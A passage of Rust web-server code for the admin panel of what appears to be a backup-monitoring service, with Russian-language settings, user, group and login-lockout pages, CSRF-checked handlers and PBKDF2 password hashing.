    if ghtml.is_empty() { ghtml = t(lang, r#"<tr><td colspan=5 style="color:#64748b;padding:10px">Нет групп</td></tr>"#).into(); }

    // Users list
    let users: Vec<(i64,String,String,String)> = db.prepare(
        "SELECT id,username,role,created_at FROM users ORDER BY role DESC,username"
    ).ok().map(|mut s| s.query_map([], |r| Ok((r.get(0)?,r.get(1)?,r.get(2)?,r.get(3)?))).ok().map(|it| it.flatten().collect()).unwrap_or_default()).unwrap_or_default();
    let mut uhtml = String::new();
    for (id,uname,urole,created) in &users {
        let role_icon = if urole == "admin" {"👑"} else {"👤"};
        let role_txt = if urole == "admin" {"admin"} else {"viewer"};
        uhtml.push_str(&fill(t(lang, r#"<tr><td><b>{u}</b></td><td>{ri} {rt}</td><td style="font-size:.8rem;color:#64748b">{cr}</td><td>
<form method=post action='/admin/users/{id}/password' style='display:inline-flex;gap:4px'>{csrf_in}
  <input type=password name=password placeholder="новый пароль" style="width:130px;padding:3px 6px;font-size:.8rem;border:1px solid #ddd;border-radius:3px">
  <button class='btn btn-sm' type=submit title="Сменить пароль">🔑</button>
</form>
<form method=post action='/admin/users/{id}/role' style='display:inline;margin-left:4px'>{csrf_in}
  <button class='btn btn-sm' type=submit title="Переключить роль" data-confirm="Переключить роль пользователя {u}?">{ri}</button>
</form>
<form method=post action='/admin/users/{id}/delete' style='display:inline;margin-left:4px'>{csrf_in}
  <button class='btn btn-sm' style='color:#dc2626;border-color:#fca5a5' data-confirm="Удалить пользователя {u}?">🗑</button>
</form>
</td></tr>"#), &[("u", &esc(uname)), ("ri", role_icon), ("rt", role_txt), ("cr", &esc(created)),
            ("csrf_in", &csrf_in), ("id", &id.to_string())]));
    }
    if uhtml.is_empty() { uhtml = t(lang, r#"<tr><td colspan=4 style="color:#64748b;padding:10px">Нет пользователей</td></tr>"#).into(); }

    let c = st.cfg();
    let ag = if c.auto_group {"checked"} else {""};
    fn state_badge(set: bool, on: &str, off: &str) -> String {
        if set {
            format!(r#"<span class="cfg-pill cfg-on">&#x2714; {on}</span>"#)
        } else {
            format!(r#"<span class="cfg-pill cfg-off">&#x2014; {off}</span>"#)
        }
    }
    // Нерасшифрованный `enc:`-блоб не считается заданным значением — иначе
    // админ видит «настроен» у ключа, которым сервер пользоваться не может.
    let is_set = |v: &str| !v.is_empty() && !restlex_core::crypto::is_undecrypted(v);
    let vp_set = state_badge(is_set(&c.viewer_password), t(lang, "установлен"), t(lang, "не установлен"));
    let tg_set = state_badge(is_set(&c.tg_token), t(lang, "настроен"), t(lang, "не настроен"));
    let ak_set = state_badge(is_set(&c.api_key), t(lang, "настроен"), t(lang, "не настроен"));

    // Список блокировок входа (in-memory) — кого и когда залочило.
    let now = now_unix();
    let mut lhtml = String::new();
    {
        let m = st.lockouts.lock().unwrap();
        let mut rows: Vec<(&String, &LoginAttempt)> = m.iter()
            .filter(|(_, a)| a.locked_until > now || a.fails > 0)
            .collect();
        rows.sort_by(|a, b| b.1.locked_until.cmp(&a.1.locked_until)
            .then(b.1.last_fail.cmp(&a.1.last_fail)));
        for (ip, a) in rows {
            let locked = a.locked_until > now;
            let status = if locked {
                fill(t(lang, r#"<span style="color:#dc2626;font-weight:600">🔒 заблокирован до {until}</span>"#), &[("until", &fmt_unix(a.locked_until))])
            } else {
                t(lang, r#"<span style="color:#64748b">попытки (не заблокирован)</span>"#).to_string()
            };
            let since = if a.locked_at > 0 { fmt_unix(a.locked_at) } else { fmt_unix(a.first_fail) };
            lhtml.push_str(&format!(
                r#"<tr><td><code>{ip}</code></td><td>{user}</td><td>{fails}</td><td style="font-size:.8rem;color:#64748b">{since}</td><td>{status}</td><td><form method=post action='/admin/lockouts/{ipe}/unlock' style='display:inline'>{csrf_in}<button class='btn btn-sm' style='color:#0369a1;border-color:#7dd3fc' type=submit>🔓 {unlock}</button></form></td></tr>"#,
                ip = esc(ip), user = esc(&a.last_user), fails = a.fails, since = since,
                status = status, ipe = url_enc(ip), csrf_in = csrf_in, unlock = t(lang, "Разблокировать")));
        }
    }
    if lhtml.is_empty() {
        lhtml = t(lang, r#"<tr><td colspan=6 style="color:#64748b;padding:10px">Нет заблокированных IP и неудачных попыток входа</td></tr>"#).into();
    }
    let lockout_state = if c.lockout_max_attempts == 0 {
        t(lang, "Локаут выключен (0 попыток)").to_string()
    } else {
        fill(t(lang, "{a} неудачных попыток → блок на {b} мин"),
            &[("a", &c.lockout_max_attempts.to_string()), ("b", &c.lockout_minutes.to_string())])
    };

    Html(fill(t(lang, r#"<!doctype html><html lang=ru><head><meta charset=utf-8><title>RestLex — Админка</title>{CSS}</head><body class="theme-{theme}">
{nav}
<div class=container>
{flash}

<div class="admin-tabs"><button class="atab active" data-tab="settings" onclick="adminTab('settings',this)">⚙ Настройки</button><button class="atab" data-tab="users" onclick="adminTab('users',this)">👥 Пользователи</button><button class="atab" data-tab="groups" onclick="adminTab('groups',this)">📁 Группы</button><button class="atab" data-tab="lockouts" onclick="adminTab('lockouts',this)">🔒 Блокировки</button></div>
<div class="panel admin-panel" data-tab="settings">
<form id="settings-form" method=post action=/admin/settings autocomplete="off">
 {csrf_in}
 <div class=fsec><span class=fsec-ic>&#x1f512;</span>Доступ</div>
 <div class=frow><label>Логин администратора</label><div class=fc><input class=fi type=text name=admin_user value="{au}" autocomplete="off"></div></div>
 <div class=frow><label>Новый пароль администратора</label><div class=fc><input class=fi type=password name=admin_password placeholder="(оставить пустым — не менять)" autocomplete="new-password"></div></div>
 <div class=frow><label>Пароль для просмотра</label><div class=fc><input class=fi type=password name=viewer_password placeholder="(оставить пустым — не менять)" autocomplete="new-password">{vp_set}</div></div>

 <div class=fsec><span class=fsec-ic>&#x2699;</span>Отображение</div>
 <div class=frow><label>История (бэкапов на профиль)</label><div class=fc><input class="fi fi-sm" type=number name=history_count value="{hc}" min=1 max=1000><span class=hint>штук</span></div></div>
 <div class=frow><label>Авто-группировка по префиксу</label><div class=fc><input type=checkbox name=auto_group {ag}><span class=hint>Профиль «PREFIX-что-угодно» → группа «PREFIX». Ручные группы с regex имеют приоритет.</span></div></div>
 <div class=frow><label>Устаревание бэкапа (часов)</label><div class=fc><input class="fi fi-sm" type=number name=stale_hours value="{sh}" min=0 step=1><span class=hint>0 = выключено</span></div></div>

 <div class=fsec><span class=fsec-ic>&#x1f4e8;</span>Telegram-уведомления</div>
 <div class=frow><label>Bot Token</label><div class=fc><input class="fi fi-lg" type=password name=tg_token placeholder="(оставить пустым — не менять)" autocomplete="new-password">{tg_set}</div></div>
 <div class=frow><label></label><div class=fc><label class=clearbox><input type=checkbox name=tg_token_clear>Убрать токен</label></div></div>
 <div class=frow><label>Chat ID</label><div class=fc><input class=fi type=text name=tg_chat value="{tg_c}" placeholder="-1001234567890" autocomplete="off"></div></div>
 <div class=frow><label>ID темы (topic)</label><div class=fc><input class="fi fi-sm" type=number name=tg_group value="{tg_g}" placeholder="793" autocomplete="off"><span class=hint>message_thread_id — тема внутри чата выше. Пусто = General.</span></div></div>

 <div class=fsec><span class=fsec-ic>&#x1f511;</span>Безопасность</div>
 <div class=frow><label>API ключ</label><div class=fc><input class="fi fi-lg" type=password name=api_key placeholder="(оставить пустым — не менять)" autocomplete="new-password">{ak_set}</div></div>
 <div class=frow><label></label><div class=fc><span class=hint>Агенты передают в заголовке <code>X-Api-Key</code></span></div></div>
 <div class=frow><label></label><div class=fc><label class=clearbox><input type=checkbox name=api_key_clear>Убрать API ключ</label></div></div>
 <div class=frow><label>Локаут: неудачных попыток</label><div class=fc><input class="fi fi-sm" type=number name=lockout_max_attempts value="{lmax}" min=0 max=1000><span class=hint>0 = выключить блокировку входа</span></div></div>
 <div class=frow><label>Локаут: блокировка (минут)</label><div class=fc><input class="fi fi-sm" type=number name=lockout_minutes value="{lmin}" min=1 max=10080><span class=hint>{lockout_state}</span></div></div>

 <div class=fsec-actions>
  <button class="btn btn-blue btn-wide" type=submit>&#x1f4be; Сохранить настройки</button>
  <button class="btn btn-wide btn-tg" type=submit form=tg-test-form>&#x1f4e8; Проверить Telegram</button>
 </div>
</form>
<form id=tg-test-form method=post action=/admin/tg-test hidden>{csrf_in}</form>
</div>

<div class="panel admin-panel" data-tab="users" style="display:none"><h3>&#x1f465; Пользователи</h3>
<div class=tbl-wrap style="margin-bottom:14px"><table style="table-layout:auto">
<tr><th>Логин</th><th>Роль</th><th>Создан</th><th style="width:280px">Действия</th></tr>
{uhtml}
</table></div>
<form method=post action=/admin/users/add style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
 {csrf_in}
 <input type=text name=username placeholder="Логин" style="width:160px" class=fi required>
 <input type=password name=password placeholder="Пароль" style="width:160px" class=fi required>
 <select name=role class=fi style="width:120px">
   <option value="viewer">viewer</option>
   <option value="admin">admin</option>
 </select>
 <button class="btn btn-blue" type=submit>&#x2795; Добавить пользователя</button>
</form></div>

<div class="panel admin-panel" data-tab="groups" style="display:none"><h3>&#x1f4c1; Группы</h3>
<div class=tbl-wrap style="margin-bottom:14px"><table style="table-layout:auto">
<tr><th>Название</th><th>Regex паттерн</th><th>Тип</th><th>Порядок</th><th style="width:40px"></th></tr>
{ghtml}
</table></div>
<form method=post action=/admin/groups/add style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
 {csrf_in}
 <input type=text name=name placeholder="Название группы" style="width:160px" class=fi>
 <input type=text name=pattern placeholder="Regex (напр. ^012-)" style="width:240px" class=fi>
 <input type=number name=sort_order placeholder="Порядок" value=0 style="width:72px" class=fi>
 <button class="btn btn-blue" type=submit>&#x2795; Добавить группу</button>
</form></div>

<div class="panel admin-panel" data-tab="lockouts" style="display:none"><h3>&#x1f512; Блокировки входа</h3>
<p style="color:var(--gray);font-size:.83rem;margin-bottom:10px">Политика: {lockout_state}. Настраивается во вкладке «⚙ Настройки». Список сбрасывается при перезапуске службы.</p>
<div class=tbl-wrap style="margin-bottom:14px"><table style="table-layout:auto">
<tr><th>IP</th><th>Последний логин</th><th>Неудач</th><th>С момента</th><th>Статус</th><th style="width:170px">Действие</th></tr>
{lhtml}
</table></div>
<form method=post action=/admin/lockouts/clear>
 {csrf_in}
 <button class="btn" type=submit data-confirm="Снять все блокировки и сбросить счётчики?" style="color:#0369a1;border-color:#7dd3fc;background:#f0f9ff">&#x1f513; Разблокировать всех</button>
</form></div>

</div>{JS_BLOCK}</body></html>"#), &[
        ("CSS", CSS),
        ("theme", theme),
        ("JS_BLOCK", t(lang, JS_BLOCK)),
        ("nav", &nav(lang, true, nav_home(lang), "", count_update_errors(&db, username), theme, csrf)),
        ("flash", flash_html(lang, fl)),
        ("au", &esc(&c.admin_user)),
        ("vp_set", &vp_set),
        ("tg_set", &tg_set),
        ("ak_set", &ak_set),
        ("ag", ag),
        ("hc", &c.history_count.to_string()),
        ("tg_c", &esc(&c.tg_chat)),
        ("tg_g", &esc(&c.tg_group)),
        ("sh", &(c.stale_hours as i64).to_string()),
        ("uhtml", &uhtml),
        ("ghtml", &ghtml),
        ("lhtml", &lhtml),
        ("lmax", &c.lockout_max_attempts.to_string()),
        ("lmin", &c.lockout_minutes.to_string()),
        ("lockout_state", &lockout_state),
        ("csrf_in", &csrf_in),
    ])).into_response()
}

/// Запись конфига вне async-воркера: `save_config` берёт кросс-процессный
/// файловый лок (его же держит GUI) и делает DPAPI + запись на диск. Держать
/// это в воркере tokio — CLAUDE.md п.5.
async fn save_config_off_thread(cfg: Config) {
    let r = tokio::task::spawn_blocking(move || save_config(&cfg)).await;
    match r {
        Ok(Err(e)) => tracing::error!("save_config: {e}"),
        Err(e) => tracing::error!("save_config task failed: {e}"),
        Ok(Ok(())) => {}
    }
}

/// Тело POST-запроса, у которого нет других полей, — только CSRF-токен.
#[derive(Deserialize, Default)]
struct CsrfForm { csrf: Option<String> }

/// 403 при неверном/отсутствующем CSRF-токене.
fn csrf_reject() -> Response {
    (StatusCode::FORBIDDEN, Html("<p>CSRF token invalid</p>".to_string())).into_response()
}

#[derive(Deserialize, Default)]
struct SettingsForm {
    csrf: Option<String>,
    admin_user: Option<String>,
    admin_password: Option<String>,
    viewer_password: Option<String>,
    viewer_password_clear: Option<String>,
    history_count: Option<String>,
    auto_group: Option<String>,
    tg_token: Option<String>,
    tg_token_clear: Option<String>,
    tg_chat: Option<String>,
    tg_group: Option<String>,
    stale_hours: Option<String>,
    api_key: Option<String>,
    api_key_clear: Option<String>,
    lockout_max_attempts: Option<String>,
    lockout_minutes: Option<String>,
}

async fn admin_settings(State(st): State<AppState>, headers: HeaderMap, Form(f): Form<SettingsForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, f.csrf.as_deref()) { return csrf_reject(); }
    let mut cfg = st.cfg();
    cfg.admin_user = f.admin_user.unwrap_or_default().trim().to_string();
    if cfg.admin_user.is_empty() { cfg.admin_user = "admin".into(); }
    if let Some(ap) = f.admin_password.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.admin_password = ap.trim().to_string();
    }
    if let Some(vp) = f.viewer_password.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.viewer_password = vp.trim().to_string();
    }
    cfg.history_count = f.history_count.unwrap_or_default().trim().parse().unwrap_or(10).max(1);
    cfg.auto_group    = f.auto_group.is_some();
    if let Some(tk) = f.tg_token.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.tg_token = tk.trim().to_string();
    } else if f.tg_token_clear.is_some() {
        cfg.tg_token = String::new();
    }
    cfg.tg_chat       = f.tg_chat.unwrap_or_default().trim().to_string();
    cfg.tg_group      = f.tg_group.unwrap_or_default().trim().to_string();
    cfg.stale_hours   = f.stale_hours.unwrap_or_default().trim().parse().unwrap_or(0.0_f64).max(0.0);
    if let Some(ak) = f.api_key.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.api_key = ak.trim().to_string();
    } else if f.api_key_clear.is_some() {
        cfg.api_key = String::new();
    }
    if let Some(v) = f.lockout_max_attempts.as_deref().and_then(|s| s.trim().parse::<u32>().ok()) {
        cfg.lockout_max_attempts = v;
    }
    if let Some(v) = f.lockout_minutes.as_deref().and_then(|s| s.trim().parse::<u64>().ok()) {
        cfg.lockout_minutes = v.max(1);
    }
    *st.cfg.lock().unwrap() = cfg.clone();
    save_config_off_thread(cfg).await;
    Redirect::to("/admin?flash=ok_s").into_response()
}

async fn admin_tg_test(State(st): State<AppState>, headers: HeaderMap, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    let cfg = st.cfg();
    if cfg.tg_token.is_empty() || cfg.tg_chat.is_empty()
        || restlex_core::crypto::is_undecrypted(&cfg.tg_token) {
        return Redirect::to("/admin?flash=err_tg_cfg").into_response();
    }
    let msg = "[RestLex] Тест — Telegram подключён ✅";
    let mut ok = true;
    // send to main chat
    if restlex_core::telegram::send_threaded(&cfg.tg_token, &cfg.tg_chat, msg, None).await.is_err() { ok = false; }
    // if tg_group is set — send to same chat in specific topic thread
    if !cfg.tg_group.is_empty() {
        if restlex_core::telegram::send_threaded(&cfg.tg_token, &cfg.tg_chat, msg, Some(&cfg.tg_group)).await.is_err() { ok = false; }
    }
    Redirect::to(if ok {"/admin?flash=ok_tg"} else {"/admin?flash=err_tg"}).into_response()
}

#[derive(Deserialize)]
struct GroupAddForm { csrf: Option<String>, name: String, pattern: Option<String>, sort_order: Option<String> }

async fn admin_group_add(State(st): State<AppState>, headers: HeaderMap, Form(f): Form<GroupAddForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, f.csrf.as_deref()) { return csrf_reject(); }
    let name = f.name.trim().to_string();
    if name.is_empty() { return Redirect::to("/admin?flash=err").into_response(); }
    let pat = f.pattern.unwrap_or_default().trim().to_string();
    let ord: i64 = f.sort_order.unwrap_or_default().trim().parse().unwrap_or(0);
    blocking_page(move || {
    let Ok(db) = st.db() else { return Redirect::to("/admin?flash=err").into_response() };
    let r = db.execute("INSERT OR IGNORE INTO groups(name,pattern,sort_order) VALUES(?1,?2,?3)", params![name,pat,ord]);
    Redirect::to(if r.is_ok() {"/admin?flash=ok_g"} else {"/admin?flash=err"}).into_response()    }).await
}

async fn admin_group_delete(State(st): State<AppState>, headers: HeaderMap, Path(gid): Path<i64>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    let Ok(db) = st.db() else { return Redirect::to("/admin?flash=err").into_response() };
    let _ = db.execute("UPDATE reports SET group_id=NULL WHERE group_id=?1", params![gid]);
    let _ = db.execute("DELETE FROM groups WHERE id=?1", params![gid]);
    Redirect::to("/admin?flash=ok_d").into_response()    }).await
}

async fn admin_profile_delete(State(st): State<AppState>, headers: HeaderMap, Path(profile): Path<String>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    let Ok(db) = st.db() else { return Redirect::to("/?flash=err").into_response() };
    let _ = db.execute("DELETE FROM reports WHERE profile=?1", params![profile]);
    Redirect::to("/?flash=deleted").into_response()    }).await
}

async fn admin_report_delete(State(st): State<AppState>, headers: HeaderMap, Path(id): Path<i64>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    let Ok(db) = st.db() else { return Redirect::to("/?flash=err").into_response() };
    let _ = db.execute("DELETE FROM reports WHERE id=?1", params![id]);
    Redirect::to(&safe_back(&headers)).into_response()    }).await
}

async fn admin_lockout_unlock(State(st): State<AppState>, headers: HeaderMap, Path(ip): Path<String>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    st.lockouts.lock().unwrap().remove(&ip);
    let _ = st.sse_tx.send(r#"{"refresh":true}"#.to_string());
    Redirect::to("/admin?flash=ok_unlock").into_response()
}

async fn admin_lockouts_clear(State(st): State<AppState>, headers: HeaderMap, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    st.lockouts.lock().unwrap().clear();
    let _ = st.sse_tx.send(r#"{"refresh":true}"#.to_string());
    Redirect::to("/admin?flash=ok_unlock").into_response()
}

// ── Password hashing (sha256 + salt) ──────────────────────────────────────────

/// Число итераций PBKDF2-HMAC-SHA256 для новых хешей.
const PBKDF2_ITERS: u32 = 200_000;

/// PBKDF2-HMAC-SHA256, dkLen = 32 (один блок). Реализовано на уже подключённых
/// hmac+sha2, чтобы не тянуть новую зависимость.
fn pbkdf2_sha256(pass: &[u8], salt: &[u8], iters: u32) -> [u8; 32] {
    type H = Hmac<Sha256>;
    // Состояние с уже впитанным ключом (ipad/opad) считается ОДИН раз и
    // клонируется. new_from_slice внутри цикла давал 4 сжатия SHA-256 на
    // итерацию вместо 2 — вход стоил вдвое дороже, чем должен.
    // HMAC принимает ключ любой длины — new_from_slice здесь не может упасть.
    let base = H::new_from_slice(pass).expect("hmac accepts any key length");
    let mut u = {
        let mut m = base.clone();
        m.update(salt);
        m.update(&1u32.to_be_bytes());
        m.finalize().into_bytes()
    };
    let mut acc = u;
    for _ in 1..iters.max(1) {
        let mut m = base.clone();
        m.update(&u);
        u = m.finalize().into_bytes();
        for (a, b) in acc.iter_mut().zip(u.iter()) { *a ^= b; }
    }
    let mut out = [0u8; 32];
    out.copy_from_slice(&acc);
    out
}

fn hash_password(plain: &str) -> String {
    let mut salt = [0u8; 16];
    use rand::RngCore;
    rand::thread_rng().fill_bytes(&mut salt);
    let dk = pbkdf2_sha256(plain.as_bytes(), &salt, PBKDF2_ITERS);
    format!("pbkdf2:{}:{}:{}", PBKDF2_ITERS, hex::encode(&salt), hex::encode(&dk))
}

/// Старый формат `sha256:salt:digest` — одно-раундовый SHA-256 без KDF.
/// Такие записи пересчитываются при следующем успешном входе.
fn needs_rehash(stored: &str) -> bool {
    stored.starts_with("sha256:")
}

fn verify_password(plain: &str, stored: &str) -> bool {
    use sha2::Digest;
    let parts: Vec<&str> = stored.split(':').collect();
    match parts.as_slice() {
        ["pbkdf2", it, salt_hex, hash_hex] => {
            let Ok(iters) = it.parse::<u32>() else { return false };
            let Ok(salt) = hex::decode(salt_hex) else { return false };
            let dk = pbkdf2_sha256(plain.as_bytes(), &salt, iters);
            hmac_eq(hex::encode(&dk).as_bytes(), hash_hex.as_bytes())
        }
        // legacy — принимаем только для миграции.
        ["sha256", salt_hex, hash_hex] => {
            let Ok(salt) = hex::decode(salt_hex) else { return false };
            let mut h = Sha256::new();
            h.update(&salt);
            h.update(plain.as_bytes());
            let digest = h.finalize();
            hmac_eq(hex::encode(&digest[..]).as_bytes(), hash_hex.as_bytes())
        }
        _ => false,
    }
}

#[derive(Deserialize)]
struct UserAddForm { csrf: Option<String>, username: String, password: String, role: Option<String> }

async fn admin_user_add(State(st): State<AppState>, headers: HeaderMap, Form(f): Form<UserAddForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, f.csrf.as_deref()) { return csrf_reject(); }
    let username = f.username.trim().to_string();
    if username.is_empty() || f.password.is_empty() { return Redirect::to("/admin?tab=users&flash=err").into_response(); }
    let role = match f.role.as_deref() { Some("admin") => "admin", _ => "viewer" };
    blocking_page(move || {
    let Ok(db) = st.db() else { return Redirect::to("/admin?tab=users&flash=err").into_response() };
    let hash = hash_password(&f.password);
    let _ = db.execute("INSERT INTO users(username,password,role) VALUES(?1,?2,?3)", params![username, hash, role]);
    Redirect::to("/admin?tab=users&flash=ok").into_response()    }).await
}

async fn admin_user_delete(State(st): State<AppState>, headers: HeaderMap, Path(uid): Path<i64>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    let _gate = st.session_gate.lock().unwrap();
    let Ok(db) = st.db() else { return Redirect::to("/admin?tab=users&flash=err").into_response() };
    // protect: don't delete self, don't delete last admin
    let me = current_username(&st, &headers);
    let target_user: Option<(String, String)> = db.query_row("SELECT username,role FROM users WHERE id=?1", params![uid],
        |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?))).ok();
    let target_name = target_user.as_ref().map(|(u, _)| u.clone()).unwrap_or_default();
    if let Some((u, r)) = target_user {
        if Some(u) == me { return Redirect::to("/admin?tab=users&flash=err_self").into_response(); }
        if r == "admin" {
            let admin_count: i64 = db.query_row("SELECT COUNT(*) FROM users WHERE role='admin'", [], |r| r.get(0)).unwrap_or(0);
            if admin_count <= 1 { return Redirect::to("/admin?tab=users&flash=err_last").into_response(); }
        }
    }
    if !drop_user_sessions_locked(&st, &target_name) { return Redirect::to("/admin?tab=users&flash=err").into_response(); }
    if db.execute("DELETE FROM users WHERE id=?1", params![uid]).is_err() {
        return Redirect::to("/admin?tab=users&flash=err").into_response();
    }
    let _ = db.execute("DELETE FROM update_view_state WHERE username=?1", params![target_name]);
    let _ = db.execute("DELETE FROM user_ui_state WHERE username=?1", params![target_name]);
    Redirect::to("/admin?tab=users&flash=ok_d").into_response()    }).await
}

#[derive(Deserialize)]
struct UserPwForm { csrf: Option<String>, password: String }

async fn admin_user_password(State(st): State<AppState>, headers: HeaderMap, Path(uid): Path<i64>, Form(f): Form<UserPwForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, f.csrf.as_deref()) { return csrf_reject(); }
    if f.password.is_empty() { return Redirect::to("/admin?tab=users&flash=err").into_response(); }
    blocking_page(move || {
    let _gate = st.session_gate.lock().unwrap();
    let Ok(db) = st.db() else { return Redirect::to("/admin?tab=users&flash=err").into_response() };
    let target_name: String = db.query_row("SELECT username FROM users WHERE id=?1", params![uid],
        |r| r.get::<_, String>(0)).unwrap_or_default();
    let hash = hash_password(&f.password);
    if !drop_user_sessions_locked(&st, &target_name) { return Redirect::to("/admin?tab=users&flash=err").into_response(); }
    if db.execute("UPDATE users SET password=?1 WHERE id=?2", params![hash, uid]).is_err() {
        return Redirect::to("/admin?tab=users&flash=err").into_response();
    }
    // Сброс пароля — самый частый способ отозвать доступ: без гашения сессий
    // старая cookie продолжала работать (и продлевалась скользящим TTL).
    Redirect::to("/admin?tab=users&flash=ok_pw").into_response()    }).await
}

async fn admin_user_role(State(st): State<AppState>, headers: HeaderMap, Path(uid): Path<i64>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    let _gate = st.session_gate.lock().unwrap();
    let Ok(db) = st.db() else { return Redirect::to("/admin?tab=users&flash=err").into_response() };
    let row: Option<(String, String)> = db.query_row(
        "SELECT role,username FROM users WHERE id=?1", params![uid],
        |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?))).ok();
    let (cur, uname) = match row { Some(c) => c, None => return Redirect::to("/admin?tab=users&flash=err").into_response() };
    let new_role = if cur == "admin" {
        let admin_count: i64 = db.query_row("SELECT COUNT(*) FROM users WHERE role='admin'", [], |r| r.get(0)).unwrap_or(0);
        if admin_count <= 1 { return Redirect::to("/admin?tab=users&flash=err_last").into_response(); }
        "viewer"
    } else { "admin" };
    if !drop_user_sessions_locked(&st, &uname) { return Redirect::to("/admin?tab=users&flash=err").into_response(); }
    if db.execute("UPDATE users SET role=?1 WHERE id=?2", params![new_role, uid]).is_err() {
        return Redirect::to("/admin?tab=users&flash=err").into_response();
    }
    // Роль лежит в SessionEntry и из БД не перечитывается — гасим сессии, иначе
    // разжалованный админ оставался админом до истечения TTL.
    Redirect::to("/admin?tab=users&flash=ok_r").into_response()    }).await
}

fn current_username(st: &AppState, headers: &HeaderMap) -> Option<String> {
    session_entry(st, headers).map(|e| e.username).filter(|u| !u.is_empty())
}

async fn sse_events(State(st): State<AppState>, headers: HeaderMap) -> Response {
    if let Some(r) = require_viewer_redirect(&st, &headers, "/events").await { return r; }
    let rx = st.sse_tx.subscribe();
    let stream = tokio_stream::wrappers::BroadcastStream::new(rx)
        .filter_map(|r| r.ok())
        .map(|data| Ok::<Event, Infallible>(Event::default().data(data)));
    let mut response = Sse::new(stream).keep_alive(KeepAlive::default()).into_response();
    // Сайт работает за nginx: буферизация задерживает события до заполнения буфера.
    response.headers_mut().insert("x-accel-buffering", HeaderValue::from_static("no"));
    response
}

async fn api_latest(State(st): State<AppState>, headers: HeaderMap) -> Response {
    if let Some(r) = require_viewer_redirect(&st, &headers, "/api/latest").await { return r; }
    let stale_h = st.cfg().stale_hours;
    blocking_page(move || api_latest_json(&st, stale_h)).await
}

fn api_latest_json(st: &AppState, stale_h: f64) -> Response {
    let Ok(db) = st.db() else {
        return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error":"db"}))).into_response();
    };
    let rows = query_latest(&db);
    let hosts = host_info_map(&db);
    let data: Vec<serde_json::Value> = rows.iter().map(|r| {
        // Prefer live host_info versions over the (possibly stale) backup-time ones.
        let host_key = r.host.as_deref().unwrap_or("");
        let (lv, av) = if let Some((g, a)) = hosts.get(host_key) {
            (g.clone(), a.clone())
        } else {
            (r.launcher_version.as_deref().unwrap_or("").to_string(),
             r.agent_version.as_deref().unwrap_or("").to_string())
        };
        serde_json::json!({
            "profile":               r.profile,
            "host":                  host_key,
            "status":                r.status,
            "started_at":            r.started_at.as_deref().filter(|s| !s.is_empty()).unwrap_or(&r.received_at),
            "received_at":           r.received_at,
            "duration_s":            r.duration_s,
            "bytes_added":           r.bytes_added,
            "files_new":             r.files_new,
            "files_changed":         r.files_changed,
            "total_bytes_processed": r.total_bytes_processed,
            "errors":                r.errors.as_deref().unwrap_or("[]"),
            "agent_version":         av,
            "launcher_version":      lv,
        })
    }).collect();
    let (rel_gui, rel_agent) = released_versions();
    Json(serde_json::json!({
        "stale_hours":      stale_h,
        "released_gui":     rel_gui,
        "released_agent":   rel_agent,
        "rows":             data,
    })).into_response()
}

async fn admin_settings_autosave(State(st): State<AppState>, headers: HeaderMap, Form(f): Form<SettingsForm>) -> Response {
    if !is_admin(&st, &headers) {
        return (StatusCode::UNAUTHORIZED, Json(serde_json::json!({"ok":false}))).into_response();
    }
    if !csrf_ok(&st, &headers, f.csrf.as_deref()) {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"ok":false,"error":"csrf"}))).into_response();
    }
    let mut cfg = st.cfg();
    if let Some(au) = f.admin_user.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        cfg.admin_user = au.to_string();
    }
    if let Some(ap) = f.admin_password.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.admin_password = ap.trim().to_string();
    }
    if let Some(vp) = f.viewer_password.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.viewer_password = vp.trim().to_string();
    }
    cfg.history_count = f.history_count.unwrap_or_default().trim().parse().unwrap_or(10).max(1);
    cfg.auto_group    = f.auto_group.is_some();
    if let Some(tk) = f.tg_token.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.tg_token = tk.trim().to_string();
    } else if f.tg_token_clear.is_some() {
        cfg.tg_token = String::new();
    }
